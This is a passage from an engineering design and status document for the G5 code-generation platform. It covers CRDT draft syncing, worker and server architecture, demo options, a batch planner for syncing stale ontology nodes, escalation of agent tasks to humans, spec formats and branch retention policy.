  ─────────────────            ─────────────────             ─────────────
  Y.Doc + y-websocket  ◄───►  Yrs Doc (Mutex)       ◄────►  CrdtDoc + tokio-tungstenite
  WebsocketProvider            CrdtAuthority                  SyncEngine
```

All three speak the **y-websocket binary protocol**. g5-api is the authoritative hub — it never connects outward. Both UI clients and workers connect in.

**Desync detection (UI side) — IMPLEMENTED:**
- `useDraftCRDT` hook tracks three states: `synced` | `syncing` | `desynced`
- State transitions based on y-websocket provider events: `sync`, `status`, `connection-close`, `connection-error`
- `lastSyncAt` timestamp tracks when the last server acknowledgment arrived

**Desync visualization (UI side) — IMPLEMENTED:**
- `SyncIndicator` component in the spec editor shows:
  - Green dot + "Synced"
  - Yellow pulsing dot + "Syncing..."
  - Red dot + "Desynced" + elapsed time ("12s ago", "2m ago")

**Recovery mechanisms — ALL IMPLEMENTED:**

| Failure | Recovery | Where |
|---------|----------|-------|
| Worker disconnects mid-edit | Exponential backoff reconnect (500ms→10s) + full state vector re-exchange | `g5d/src/crdt/sync.rs` |
| UI disconnects | y-websocket auto-reconnect (up to 16s backoff) + token refresh | `client/src/lib/crdt.ts` |
| Concurrent worker + human edit | Yrs/Yjs deterministic CRDT merge — no conflict resolution needed | CRDT semantics |
| Broadcast channel lag | Server detects `Lagged(n)` → `send_full_resync()` | `g5-api/src/crdt/authority.rs` |
| Document >100MB | Server sends WS close 1008 (Policy Violation) | `authority.rs` |
| Corrupt Yjs update | Error logged, connection continues | `authority.rs` |
| Dangerous git commands | Blocked by safety layer: "would desync CRDT draft layer" | `g5d/src/git/safety.rs` |

#### 16.2.2 What's Missing (Small Additions)

| Gap | Impact | Fix | Effort |
|-----|--------|-----|--------|
| **Worker-side sync state not exposed to UI** | UI can't show "Agent desynced" in participant list | Add `syncState` field to worker's Yjs awareness metadata | 1 hour |
| **Server doesn't track per-client sync lag** | Can't proactively warn slow clients | Add `last_confirmed_revision` per client in `DocumentHandle` | 2 hours |
| **Worker queue overflow → silent divergence** | >10MB outbound queue logs warning but doesn't trigger corrective full resync | Add "resync needed" state transition on threshold | 1 hour |
| **No CRDT health endpoint** | Can't monitor sync health across documents | `GET /health/crdt` exposing doc count, client count, last-activity per doc | 2 hours |

#### 16.2.3 Verdict

**We don't need a major desync tracking initiative.** The existing `SyncIndicator` + y-websocket recovery + CRDT merge semantics handle the common cases. The four gaps above are small polish items. The CRDT is the one part of the system that genuinely "just works" — Yrs/Yjs guarantees eventual convergence regardless of network conditions or edit ordering.

The one thing worth adding for **demo visibility** is the worker-side awareness state. When the user sees a worker editing their spec, it would be reassuring to see "Agent: synced" or "Agent: syncing..." in the collaborator list, just like Google Docs shows other users' connection state.

---

### 16.3 Demo Viability — Is Connected-Worker-Only Enough?

**Short answer: No. g5d cannot operate without g5-api. But the demo path is clearer than it looks.**

#### 16.3.1 Architecture Reality

G5 is a hub-and-spoke system. g5-api is the indispensable hub:

```
             ┌──────────┐
             │  g5-api   │  ← The brain: auth, scheduling, state, CRDT authority
             │  (Rust)   │     all CRUD, WebSocket event hub
             └────┬──┬───┘
                  │  │
        ┌─────────┘  └──────────┐
        ▼                       ▼
  ┌──────────┐           ┌──────────┐
  │  React   │           │   g5d    │  ← The muscle: code generation, analysis
  │  Client  │           │ (Worker) │     can't flex without g5-api instructions
  └──────────┘           └──────────┘
```

**g5d worker mode requires g5-api for everything:**
- `POST /api/internal/workers/register` — worker can't start without successful registration
- `POST /api/internal/workers/:id/poll` — worker gets tasks from g5-api
- `POST /api/internal/tasks/:id/transition` — worker reports state changes to g5-api
- WebSocket to g5-api's CRDT authority — worker reads/writes specs through g5-api

There is **no standalone/offline mode** for g5d. `g5d init` and `g5d doctor` work locally, but that's just CLI tooling, not the generation pipeline.

#### 16.3.2 Current Implementation Status

| Component | Status | Blockers |
|-----------|--------|----------|
| **React client (prototype)** | Full UI mockup with hardcoded data | Zero API calls — all mock |
| **React client (generation)** | Complete data layer (React Query, WS, CRDT) | Needs running g5-api |
| **g5-api routes/services** | Fully defined (handlers, DTOs, DB schema, 213 sqlx cache files) | **`main.rs` is a stub** — prints "g5-api — not yet wired up" |
| **g5-api infrastructure** | DB pool, middleware, router all coded | Needs main.rs wiring |
| **g5d worker loop** | Structure complete | Agent loop placeholder: "Agent loop not yet initialized" |
| **g5d CLI** | `init`, `doctor`, `commit`, `revert` work | Non-worker commands functional |
| **Docker Compose** | Postgres 17 + Redis defined | Works, just needs g5-api binary |

#### 16.3.3 What Breaks Without Each Component

| Missing | Impact |
|---------|--------|
| **Postgres** | g5-api cannot start — all state is in Postgres |
| **Redis** | Single-instance g5-api works without it (Redis is for multi-instance pub/sub). Health endpoint reports unhealthy but operational |
| **SCM (GitHub/GitLab)** | No OAuth login, no repo import. Blocks auth entirely |
| **LLM provider** | No code generation, no chat. Tasks fail at execution |
| **g5-api** | Nothing works — worker can't register, client has no backend |
| **g5d** | UI works for browsing (ontology, specs, files) but no actual generation |

#### 16.3.4 Demo Options (Ranked by Fidelity)

**Option A: UI Mockup Demo — Available Today**
```
Just: npm run dev (prototype client)
```
- Full UI walkthrough: ontology tree, spec editor, code viewer, job queue, chat panel, file tree, diff viewer, dependency graphs, Mermaid diagrams
- All hardcoded mock data — nothing is live
- **Good for:** Showing the vision, UX demo, investor pitch
- **Effort:** Zero

**Option B: Full-Stack Demo — Requires Wiring**
```
Postgres + Redis + g5-api + g5d + React client + LLM API key
```

| Step | Work | Unlocks |
|------|------|---------|
| 1. Wire g5-api `main.rs` | Connect DB pool + router + middleware stack (all code exists, just needs assembly) | Backend comes alive |
| 2. Stand up docker-compose.dev.yml | `docker compose up` — Postgres 17 + Redis | Persistent state |
| 3. Dev auth bypass | Skip OAuth, use a fixed JWT or API key | No SCM dependency for demo |
| 4. Seed data script | SQL insert of sample org + workspace + ontology + specs | Browsable content without repo import |
| 5. Wire g5d agent loop | Connect to LLM provider (Anthropic/OpenAI/Ollama) | Actual generation |

**The single most impactful task is Step 1** — wiring g5-api's `main.rs`. All route handlers, service implementations, and DB queries exist. The gap is literally the top-level `main()` function that creates the Axum router and starts listening.

**Option C: Hybrid — Mock UI + Selective Backend**
- Use the prototype client with mock data for the full UI walkthrough
- Have g5-api + g5d running for a live code-generation segment (switch to generation client for that part)
- **Good for:** Staged demo — "here's the UX" → "and here's it actually working"

#### 16.3.5 Recommendation

**For an imminent demo: Option A (UI mockup).** It works today, shows the full product surface, and is risk-free.

**For a demo with live generation:** The critical path is:
1. Wire `main.rs` (~4-6 hours)
2. Dev auth bypass (~2 hours)
3. Seed script (~2 hours)
4. Wire agent loop in g5d (~4-8 hours, depending on prompt integration)

Total: ~2-3 focused days to a live end-to-end demo. The infrastructure is there — it just needs the final assembly.

---

### 16.4 Batch Job Triggering — "Sync All Out-of-Date Nodes"

#### 16.4.1 Current Job Creation Model

The current API accepts:

```
POST /api/v1/workspaces/:workspaceId/jobs
{
  "jobType": "uplift" | "downlift" | "compile" | "test" | "review" | "chat" | "custom",
  "targetNodes": ["<uuid>", ...],
  "maxConcurrency": 4,
  "priority": 0,
  "dependsOnJob": "<uuid>" | null,
  "force": false
}
```

`target_nodes[0]` becomes the `start_node`. A single **bootstrap task** is created, which a worker picks up, analyzes the subtree, and submits the full task graph. The task graph is per-job, scoped to the start node's subtree, with dependencies mirroring the ontology DAG.

**Today's model: one job = one subtree root.** The `targetNodes` array technically accepts multiples, but only `[0]` is used as the start node. No batch UI exists.

#### 16.4.2 Staleness Model

Each ontology node has three timestamps:

| Field | Meaning |
|-------|---------|
| `content_updated_at` | When content was last modified |
| `last_uplifted_at` | When this node's spec was last refreshed by uplift |
| `last_downlifted_at` | When this node's code was last refreshed by downlift |

**Staleness rules:**
- `uplift_stale` = `content_updated_at > last_uplifted_at` (or never uplifted)
- `downlift_stale` = `content_updated_at > last_downlifted_at` (or never downlifted)

There is currently **no endpoint to query all stale nodes** — staleness is computed per-node in `ontology_service::compute_staleness`.

#### 16.4.3 The Problem: Batch Sync with Dependencies

If a user wants to "sync all out-of-date nodes", the naive approach — fire one job per stale node — doesn't work because of the dependency DAG:

```
        spec/auth          ← stale (needs downlift)
       /         \
  code/validator  code/jwt ← both stale (need downlift)
```

If we downlift `spec/auth` and both children independently, we waste work if `spec/auth`'s downlift changes the children's input. Conversely for uplift:

```
        spec/auth          ← stale (needs uplift)
       /         \
  code/validator  code/jwt ← both stale (need uplift first)
```

The children must uplift before the parent aggregates them. And if there are **cross-subtree dependencies** (node A in subtree X depends on node B in subtree Y), subtree Y's job must complete before subtree X's job starts.

#### 16.4.4 Proposed Architecture: Batch Sync Planner

**New endpoint:**

```
POST /api/v1/workspaces/:workspaceId/sync
{
  "direction": "uplift" | "downlift",
  "scope": "all_stale" | "selected",
  "nodeIds": ["<uuid>", ...],      // only if scope = "selected"
  "force": false,
  "maxConcurrency": 4
}
```

**Server-side planner algorithm:**

```
1. QUERY stale nodes
   SELECT id, parent_id FROM ontology_nodes
   WHERE workspace_branch_id = :branch
     AND content_updated_at IS NOT NULL
     AND (direction == 'uplift'
          ? (last_uplifted_at IS NULL OR content_updated_at > last_uplifted_at)
          : (last_downlifted_at IS NULL OR content_updated_at > last_downlifted_at))
   
2. COMPUTE minimal root set
   - For each stale node, walk up to find the highest stale ancestor
   - Deduplicate: if A is an ancestor of B and both are stale, only A is a root
   - Result: set of independent subtree roots
   
3. RESOLVE cross-subtree dependencies
   - Query node_dependencies for edges between the root set's subtrees
   - Build a DAG of subtrees (not individual nodes)
   
4. TOPOLOGICAL SORT subtree DAG
   - Order: dependencies before dependents
   - For uplift (leaf-first): reverse the sort
   - For downlift (root-first): natural order
   
5. CREATE JOBS in dependency order
   - One job per subtree root
   - Chain via depends_on_job following the topological order
   - Independent subtrees (no cross-deps) can run in parallel
   
6. RETURN job plan to client
   { "jobs": [...], "totalNodes": N, "estimatedTasks": M }
```

**Example:**

Given stale nodes: `auth/`, `auth/validator`, `auth/jwt`, `payments/`, `payments/stripe`:

```
Step 2: Minimal roots = [auth/, payments/]
         (validator and jwt are under auth/, so auth/ subsumes them)

Step 3: Cross-deps? If payments/ depends on auth/:
         auth/ ──depends-on──► payments/
         
Step 4: Order = [auth/, payments/]

Step 5: Job 1: uplift auth/ (no predecessor)
         Job 2: uplift payments/ (depends_on_job = Job 1)
```

If no cross-deps, both jobs run in parallel with `depends_on_job = NULL`.

#### 16.4.5 Frontend UX

**Option A: "Sync All" Button (Simple)**

On the workspace toolbar or ontology tree header:

```
┌─────────────────────────────────────────┐
│ Ontology               [↻ Sync All ▾]  │
│                          ├ Sync All Stale│
│  📁 auth/        ⚠️     ├ Uplift All    │
│    📄 validator  ⚠️     └ Downlift All  │
│    📄 jwt        ⚠️                     │
│  📁 payments/    ✓                      │
│    📄 stripe     ✓                      │
└─────────────────────────────────────────┘
```

⚠️ badge = stale indicator (computed client-side from the three timestamps already in `OntologyNodeDTO`).

Click "Sync All Stale" → `POST /workspaces/:id/sync { scope: "all_stale", direction: "uplift" }` → shows a confirmation dialog with the job plan → user confirms → jobs are created.

**Option B: Multi-Select + Batch Action**

Checkbox selection on stale nodes → toolbar shows "Sync 3 nodes" button.

```
┌──────────────────────────────────────────┐
│ ☑ auth/           ⚠️    [Uplift 3 ▸]   │
│   ☑ validator     ⚠️                     │
│   ☑ jwt           ⚠️                     │
│ ☐ payments/       ✓                      │
└──────────────────────────────────────────┘
```

This gives users fine-grained control but requires more UI work.

**Recommendation: Option A for MVP, Option B for production.** The "Sync All Stale" pattern covers 80% of use cases with minimal UI complexity.

#### 16.4.6 Required Additions

| Component | Change | Effort |
|-----------|--------|--------|
| **Backend** | `GET /api/v1/workspaces/:id/stale-nodes` — batch staleness query | 2 hours |
| **Backend** | `POST /api/v1/workspaces/:id/sync` — batch sync planner | 4-6 hours |
| **Backend** | Topological sort + cross-dep resolution in job planner | Included above |
| **Frontend** | Staleness badge on ontology nodes (data already available) | 2 hours |
| **Frontend** | "Sync All" dropdown + confirmation dialog | 3-4 hours |
| **Frontend** | `useBatchSync` hook + `useStalenessQuery` hook | 2 hours |

#### 16.4.7 Lane Sequencing — Why This Works with Existing Infrastructure

The existing lane system already chains batch jobs sequentially within a workspace. The batch sync planner just needs to set `depends_on_job` explicitly based on the cross-dependency analysis rather than relying on the default "most recent batch job" chaining.

For independent subtrees, setting `depends_on_job = NULL` lets them run in parallel — the scheduler handles concurrency. For dependent subtrees, the `depends_on_job` chain ensures correct ordering.

The `max_concurrency` field already limits how many tasks within a job run simultaneously. For batch sync, the user can choose: `maxConcurrency: 1` (conservative, one task at a time) or `maxConcurrency: 8` (aggressive, 8 parallel tasks across workers).

---

### 16.5 Open Questions

54. **LLM request logging: inline or separate table?** Option A: Add `request_payload JSONB` and `response_payload JSONB` columns to `chat_messages` and `timeline_entries`. Simpler, but bloats existing tables (50KB+ per row). Option B: Separate `llm_request_log` table with foreign keys back to messages/timeline entries. Cleaner, easier to partition and archive. **Recommendation: Option B (separate table). The training pipeline needs to query these in bulk by date range — a dedicated table with monthly partitioning is ideal.**

55. **CRDT edit attribution: Yjs metadata or wrapper table?** Yjs doesn't natively track per-update author. Option A: Wrap each binary update with `(user_id, timestamp)` metadata in the `draft_updates` table (add columns). Option B: Use Yjs awareness protocol to broadcast authorship and reconstruct attribution server-side. **Recommendation: Option A. Simple, reliable, and survives compaction if we store attribution separately from the binary update.**

56. **Batch sync: single mega-job or multiple chained jobs?** A: One job with all stale nodes in its task graph — simpler to monitor, but one failure blocks everything, and the bootstrap phase becomes complex. B: One job per subtree root, chained via `depends_on_job` — leverages existing infrastructure, failures are isolated. **Recommendation: Option B. The lane/chaining system already handles this. Each job is independently restartable.**

57. **Staleness propagation: eager or lazy?** When a node's content changes, should we immediately mark all dependent nodes as stale (eager), or compute staleness on-demand by comparing timestamps (lazy)? Current: lazy (compare timestamps in `compute_staleness`). **Recommendation: stay lazy for now. Eager propagation requires traversing the dependency graph on every edit — expensive for deep trees. Lazy is O(1) per query and the timestamps are already indexed.**

58. **Should the batch sync planner preview be a dry-run or commit?** Should `POST /workspaces/:id/sync` immediately create jobs, or first return a plan that the user confirms? **Recommendation: two-step. First call returns the plan (job count, task estimate, dependency chain). User confirms. Second call creates jobs. This prevents accidental 50-job submissions.**

## §17 — System Design Clarifications (16 Questions)

### 17.1 CRDT Draft vs. Git — Authority, Divergence, and Rebase

#### Q: What is the authoritative source during active editing?

**The CRDT draft (Y.Doc hosted by g5-api) is the sole source of truth during an active draft session. The worker's filesystem is a materialization.**

From `AGENTS.md`: *"The worker's local filesystem is a materialization of the draft. It exists for tool execution but is not the durable state. The draft is."*

#### Q: How do edits flow?

**Filesystem-first, then CRDT delta enqueued.** This is deliberate — tools like `run_in_terminal` need to see the change immediately:

1. Agent tool writes to disk (e.g., `write_file` → `std::fs::write`)
2. `CrdtPeer::enqueue_file_write()` updates the local Y.Doc and enqueues a delta
3. `SyncEngine` flushes deltas to g5-api in batches (500ms timer or explicit flush after each tool call)
4. g5-api applies the update under Mutex, broadcasts to all other peers
5. Other UI clients/workers receive the update and (optionally) materialize to their filesystem

For the reverse direction (human edits in the UI):
1. g5-api pushes delta to worker via WebSocket
2. Worker applies to local Y.Doc
3. Materializer writes to disk at the next "safe point" (between tool calls — `set_safe_to_materialize()`)

#### Q: Does each worker keep one draft per file?

**No — one CRDT draft per (workspace, branch), not per file.** The Y.Doc contains all files as named `Y.Text` entries keyed by relative path (e.g., `"src/main.rs"`). On the server, `DocumentStore` keys docs by `(workspace_id, branch_name)`. The DB enforces `UNIQUE(workspace_branch_id)` on `draft_sessions`.

**Overhead:** The Y.Doc holds in-memory Yrs state for all dirty files in the draft. Typical overhead is ~2-5x the raw text size for the CRDT metadata. A 1MB codebase with 50 dirty files ≈ 3-5MB of Y.Doc memory. Persistence: incremental binary updates to `draft_updates` table every few seconds, compacted to a single snapshot when 50+ updates accumulate.

#### Q: What prevents divergence from shell commands?

**No file watcher. Instead: snapshot-based diff after every terminal command.**

`FsDiffDetector` (`g5d/src/worker/fs_diff.rs`) takes before/after filesystem snapshots (mtime + content hash) around each `run_in_terminal` call. Changed files are automatically fed back into the CRDT as deltas with author `"agent:terminal"`. This catches:
- `npm install` modifying `package-lock.json`
- Build tools generating output files
- Formatter rewriting source files

Additionally, `git/safety.rs` **blocks destructive git commands** in agent terminals: `checkout`, `switch`, `reset`, `stash`, `clean`, `merge`, `rebase`, `restore` — all return a user-friendly error explaining "would desync the CRDT draft layer."

#### Q: What happens when a tracking branch is pushed while a draft exists?

**The draft is rebased, not blocked or discarded.**

1. Server detects tracking branch advance (via webhook or poll)
2. Runs 3-way merge via `git2` on each dirty file (base=old HEAD, ours=draft, theirs=new HEAD)
3. Updates Y.Doc with rebased content
4. Sends `draft_rebase` WebSocket event with `rebased_files` and `conflicted_files`
5. If conflicts exist, `DraftSession.conflicts` is populated — **commit is blocked** (409 `"unresolved_conflicts"`) until resolved
6. The conflict is injected into the agent's message inbox so it can attempt auto-resolution

**Would this ever happen?** Yes — in tracking-mode branches where the remote advances independently (e.g., CI merges, other developers pushing). Less likely in pinned-mode branches.

---

### 17.2 Worker Lifecycle, Worktree Sharing, and Task Branch Dependencies

#### Q: Is a lifecycle of test-gen → code-gen → auto-fix one agent or three?

**Three separate tasks, each getting its own worker.** The design is explicit: *"Every task requires a dedicated worker — there is no degraded backend mode."* Each task gets:
- Its own `task/{task_id}` branch, branched from the specified `base_commit`
- Its own git worktree at `{worktree_dir}/{task_id}/`
- Its own Kata VM (cloud) or process (local)

Workers are persistent (multi-task) — they poll for work, execute a task, then go back to idle and pick up the next task. But each task is an isolated execution with its own branch and worktree. The worktree is created at task start and removed at task end.

#### Q: Can worktrees/Kata VMs be shared to reduce latency?

**Not currently — but they could be with two changes:**

1. **Worktree reuse:** After task A completes on a worker, the worker could keep the worktree and rebase it to the new base_commit instead of deleting and re-cloning. This saves the clone+checkout time (~2-5s local, ~10-30s cloud). The `poll_execute_loop` already loops — adding a "check if existing worktree is compatible" step before Phase 2 (CLONE+PATCH) would enable this.

2. **Kata VM reuse:** Workers already self-terminate on idle timeout (default 5 min). If the scheduler detects that more tasks are coming for the same workspace, it can keep the worker alive by ensuring the poller gets a new assignment before timeout. The locality scorer already prefers workers that recently worked on "nearby" ontology nodes — this naturally keeps the same worker handling sequential tasks in the same subtree.

**Recommended approach for the test-gen → code-gen → auto-fix pipeline:** Use the existing `depends_on` mechanism to chain the three tasks. Each task's `base_commit` is set to the parent task's result commit. The idle timeout + locality scoring means the same worker will likely pick up all three tasks in sequence, retaining its warm Kata VM and filesystem caches. The main cost is the worktree teardown/recreate — adding worktree reuse would eliminate that.

#### Q: How would D4X's dynamic agent integrate with shared execution?

With the current model, a D4X-style dynamic agent that decides at runtime whether to do test-gen, code-gen, or auto-fix would be **simpler to support** — it would be a single long-running task with one worktree, making one-pass decisions internally. The current architecture already supports this: a task can run any combination of tools. The task type (`compile`, `uplift`, `downlift`, etc.) is a scheduling hint, not a hard constraint on what the agent can do.

The harder question is dynamic **task graph expansion** — where the agent discovers mid-execution that it needs to spawn subtasks. The current model supports this: the bootstrap task can call `submit_task_graph` to dynamically add tasks to the job. A D4X supervisor agent would be the bootstrap task, analyzing scope and submitting a tailored task graph rather than using the static uplift/downlift patterns.

#### Q: How do child tasks depend on parent task changes?

**Each task has a `base_commit` field.** The child task's `base_commit` is set to the parent task's result commit SHA (pushed to `task/{parent_task_id}` branch). The scheduler ensures children don't start until all parents are `completed`:

```sql
-- Task is "ready" only when all deps are completed:
AND NOT EXISTS (
    SELECT 1 FROM tasks dep
    WHERE dep.id = ANY(t.depends_on) AND dep.status <> 'completed'
)
```

So the flow is:
1. Parent task runs → commits to `task/{parent_id}` → pushes → reports complete
2. Child task becomes "ready" → worker picks it up
3. Child creates `task/{child_id}` branching from parent's commit
4. Child sees all of parent's changes in its working tree

**Task branches do NOT auto-merge.** They remain as separate branches. Final integration is via the draft commit flow (user-initiated) or a future merge strategy.

---

### 17.3 Multi-Repo Workspaces

#### Q: Is the unified `root.g5.md` spanning multiple repos just a UI concern?

**Mostly, but not entirely.** The DB schema already supports multi-repo workspaces:
- `workspace_branches` has `UNIQUE(workspace_id, repo_id)` — one row per repo in a workspace
- `repos` table stores `git_url`, `provider`, `provider_repo_id` per org
- `workspaces` can have a separate `docs_repo_id` / `docs_branch_name`
- `workspace_dependencies` table creates a DAG between workspaces

The ontology tree (`ontology_nodes`) is keyed by `workspace_branch_id`. A multi-repo workspace has multiple `workspace_branches`, each with its own ontology subtree. The root `root.g5.md` would span across these — that's a UI composition concern.

**Where it affects g5-api and g5d:**
- Worker dispatch injects `G5_WORKSPACE_REPOS` as a JSON array: `[{"name":"backend","url":"...","commit":"abc","branch":"feat/x"}, {"name":"frontend","url":"...","commit":"def","branch":"feat/x"}]`
- `init-workspace.sh` iterates and clones each repo into separate directories
- Worker needs separate git worktrees per repo
- CRDT paths need repo-scoping: `backend/src/main.rs` vs `frontend/src/App.tsx`

**Cross-repo edits by a single task** (e.g., debugging E2E system tests): Currently, a task targets one `node_id` in one repo's ontology. A cross-repo task would need:
1. Task targeting a node that spans repos (or a workspace-level node)
2. Worker with worktrees for all relevant repos
3. CRDT paths scoped by repo name

This is **not currently supported** — tasks are scoped to a single ontology subtree. For M0, a cross-repo debugging session would be handled via the chat agent (workspace-scoped, with access to all repos in the workspace) rather than a structured task.

#### Q: Can there be cross-repo views/linked docs/test cases?

- **Cross-repo views:** The UI can compose multiple repos' ontology trees into a single view — this is a frontend concern.
- **Linked docs across repos:** The `node_dependencies` table uses ontology node UUIDs, which are globally unique. Cross-repo edges are possible if both repos are in the same workspace. The cycle detection already handles generic DAG edges.
- **Cross-repo test cases:** Test files could reference source code in another repo for E2E/integration tests. These would live in whichever repo contains the test, with `node_dependencies` edges pointing to nodes in the other repo. Where they live is a repo layout decision, not a system constraint.

**For M0: don't worry about cross-repo. Each repo's ontology is self-contained. Cross-repo concerns are M2+.**

---

### 17.4 Agent Design — Enforcement, Verification, and Human Escalation

#### Q: How do we enforce code/ontology consistency?

Currently, the spec validation pipeline is:
1. `validate_spec` tool — checks YAML frontmatter, markdown format, required fields
2. `extract_interface` → spec comparison — uplift ensures the spec reflects actual code signatures
3. Agent's judgment — the LLM is prompted to verify consistency before calling `transition_task_state("complete")`

**What's missing:** There's no automated post-task verification that the spec actually matches the code. A dedicated `verify_consistency` step should run after task completion:
- Parse spec → extract claimed interfaces
- Parse code → extract actual interfaces via `extract_interface`
- Diff → flag discrepancies
- Block completion if discrepancies exceed a threshold

This is a spec-level addition, not an architecture change. The agent tool infrastructure supports it.

#### Q: How does human escalation work?

The task state machine has a dedicated `BLOCKED` state — the only non-terminal failure state:

| Trigger | Mechanism |
|---------|-----------|
| Agent calls `transition_task_state("blocked", reason: "...")` | Agent recognizes it's stuck |
| `FAILED` with retries exhausted | Auto-escalation to `BLOCKED` |
| Spend limit exceeded | `BudgetExhausted` → BLOCKED |

**Resolution:** `BLOCKED → RUNNING` when a human sends a message to the task's chat session. The message is injected into the agent's dialog and the loop resumes. The `useInjectMessage` hook in the UI handles this.

**What's missing:** Severity levels. Currently, BLOCKED is a single state. We should add:
- `blocked_info` — agent has a question (can proceed if human ignores after timeout)
- `blocked_review` — agent wants human review before proceeding (changes are staged, not committed)
- `blocked_critical` — agent cannot continue (missing credentials, irreconcilable conflict, spec ambiguity)

This is a metadata addition to the `blocked` state, not a state machine change.

---

### 17.5 Ontology Language — What Goes at Each Level

Current spec format is YAML frontmatter + free-form Markdown. The four frontmatter fields: `component_id`, `src_files`, `parent_spec`, `child_specs`.

#### Proposed content by level:

**Root level (`root.g5.md`):**
- System-wide architecture description
- Cross-cutting concerns (auth model, error handling strategy, deployment topology)
- **Children navigation:** list of top-level modules with one-line descriptions
- **Boundary specification:** what is in-scope vs out-of-scope for this codebase
- **Uncertain/under-specified points:** open questions, deferred decisions
- Human-edited vs auto-generated: primarily human-authored

**Module level (`auth/module.g5.md`):**
- Module purpose and responsibility boundary
- **Children navigation:** list of component files with role descriptions
- Public API surface (what this module exports to other modules)
- **Children boundary:** ownership boundary — what files belong to this module and what doesn't
- Dependencies (which other modules this one depends on and why)
- **Uncertain points:** known tech debt, planned refactors
- Human-edited vs auto-generated: primarily auto-generated from uplift, with human annotations

**File level (`auth/validator.g5.md`):**
- Detailed algorithm/logic description
- Function-by-function interface extracted from `extract_interface`
- Invariants and preconditions
- Test coverage expectations
- **Uncertain points:** edge cases, known limitations
- Human-edited vs auto-generated: auto-generated, human-refined

#### Suggested frontmatter additions:

```yaml
---
component_id: "auth/validator"
src_files: ["src/auth/validator.rs"]
parent_spec: "auth"
child_specs: []
# New fields:
authorship: "auto"           # "auto" | "human" | "mixed"
last_human_edit: "2026-01-15T..."
confidence: 0.85             # model's self-assessed confidence
open_questions:              # structured uncertainty
  - "Should rate limiting be per-user or per-token?"
  - "Error format for downstream consumers TBD"
children_summary:            # navigation aid (module-level only)
  - id: "auth/validator"
    role: "JWT validation and claims extraction"
  - id: "auth/middleware"
    role: "Axum middleware for route protection"
---
```

---

### 17.6 Naming — G5 vs SemLift, Ontology vs Specs

**Current state:** g5-api is clean (zero SemLift references). g5d has a split: `.semlift/specs/` is the new convention, `.g5/specs/` is the legacy fallback. The code supports both with `.semlift` preferred.

**The naming should be unified.** Proposal:

| Old | New | Scope |
|-----|-----|-------|
| SemLift | G5 | Product name everywhere |
| `.semlift/specs/` | `.g5/specs/` | On-disk spec directory |
| `semlift.yaml` | `g5.yaml` | Workspace config file |
| `*.semlift.md` | `*.g5.md` | Spec file extension |
| "spec" | "ontology node" (tree) / "spec" (content) | Terminology |

**"Spec" vs "Ontology"** — these aren't synonyms:
- **Ontology** = the tree/graph structure (nodes, edges, hierarchy, staleness)
- **Spec** = the content of an ontology node (the Markdown document)
- In code: `OntologyNode` has a `file_path` that points to a spec file. The spec is the *content*, the node is the *structural element*.

Keep both terms, use them precisely. Don't rename `ontology_nodes` to `specs` or vice versa.

---

### 17.7 extract_interface — Ontology or Source Code?

**Currently applies to source code only.** The tool parses `.rs`, `.py`, `.ts`, `.go`, `.java`, `.c`, `.cpp` files and extracts:
- Function signatures
- Class/struct/trait definitions
- Constants and exports
- Import statements

It does NOT parse ontology spec files. Per `AGENTS.md`: *"Used by uplift only — extracts public symbols from source code files."*

**Should it also extract structure from ontology?** The ontology format is Markdown with YAML frontmatter — there's no "interface" to extract. However, a `summarize_spec` tool that extracts the claimed public API from a spec (by parsing Markdown headings and code blocks) would be useful for downlift — ensuring the code actually implements what the spec claims. This is complementary to `extract_interface`, not a replacement.

---

### 17.8 Chat Prompts — Anti-Pattern Review and Copilot Integration

#### Anti-pattern review

This should be a **mandatory post-generation validation step**, not just a prompt component. Proposal:

1. After code generation completes, the agent runs `extract_interface` on the output
2. Agent feeds the code to a `review_code` tool with anti-pattern checklist specific to the language
3. If anti-patterns are detected, the agent self-corrects before calling `transition_task_state("complete")`
4. The anti-pattern library is maintained as prompt templates in `g5d/src/prompts/templates/`

The existing prompt template system supports this — adding a `code_review.tera` template with anti-pattern rules is straightforward.

#### Copilot as chat agent

There are two integration approaches:

**A. Use Copilot's extensions/skills API:** G5's chat agent would delegate specific questions to Copilot via MCP or tool-use. G5 handles orchestration, context assembly, and ontology awareness; Copilot handles code completion and in-file suggestions.

**B. G5 replaces Copilot chat entirely:** G5's chat is already a full agent with tool-use, streaming, fork/resume. The advantage over Copilot: G5 has ontology context, spec awareness, and persistent memory (chat sessions with full history).

**Recommendation: Option B for M0 — G5's chat IS the chat agent. For M1+, add Copilot as a tool that the G5 agent can invoke for specific subtasks (code completion, quick fixes).** The system prompt and skills from Copilot are valuable references for G5's prompt engineering but shouldn't be imported wholesale — G5's prompts need to be ontology-aware.

---

### 17.9 D4X Integration — Continuous Learning and Supervisor Agent

**Currently: zero D4X references in the codebase.** No design docs, no integration plan.

The D4X concepts that map to G5:

| D4X Concept | G5 Equivalent | Status |
|-------------|--------------|--------|
| Continuous learning from feedback | `llm_request_log` (§16.1.4) + human edit tracking | Proposed in §16, not built |
| Supervisor agent | Bootstrap task that dynamically submits task graphs | Architecture exists, prompt doesn't |
| Self-improvement loop | Compare agent output vs human edits → fine-tune prompts | No infrastructure |
| Human-like oversight | `BLOCKED` state + task injection | Built, severity levels missing |

**Recommendation: defer D4X integration design to M1.** The prerequisite infrastructure (LLM request logging, edit attribution, prompt versioning) was proposed in §16. Once that data collection is in place, the D4X learning loop becomes a data pipeline concern rather than an architecture change. The supervisor agent pattern is a prompt engineering task — the bootstrap task mechanism already supports dynamic graph submission.

---

### 17.10 Task Branch and Draft Lifecycle — Retention Policy

**Current state: task branch cleanup is an open question.** Canonical drafts retain ownership until commit or explicit discard; inactivity never ages them out. Old task-scoped sessions are purged only after their owning task is terminal and non-retryable. Branch and chat session retention otherwise have no policy.

Proposed retention policy:

| Artifact | Retention | Cleanup |
|----------|-----------|---------|
| **Task branch** (`task/{task_id}`) | 7 days after task reaches terminal state | Maintenance task: delete remote branch via SCM API |
| **Canonical draft session** | Until successful commit or explicit discard | Commit/discard lifecycle; inactivity never releases ownership |
| **Task draft session** | Stable for one execution attempt; old terminal non-retryable overlays purge after retention | Retry lifecycle + `draft_cleanup` task |
| **Draft updates** (CRDT incremental) | Deleted on compaction, commit, or discard | Existing compaction + commit/discard logic |
| **Chat sessions** | Permanent (workspace-scoped), task-scoped sessions archived on task completion | No cleanup needed — valuable training data |
| **Timeline entries** | 30d, then pruned to last 100/task | Existing `timeline_cleanup` task |
| **Task checkpoints** | Permanent | No cleanup |
| **Usage records** | Permanent | No cleanup (needed for billing) |

**Missing maintenance task:** Branch cleanup. Should run daily, query tasks in terminal states older than 7 days, delete their `task/{task_id}` branches via SCM API. Add to `MaintenanceRunner::spawn_all()`.

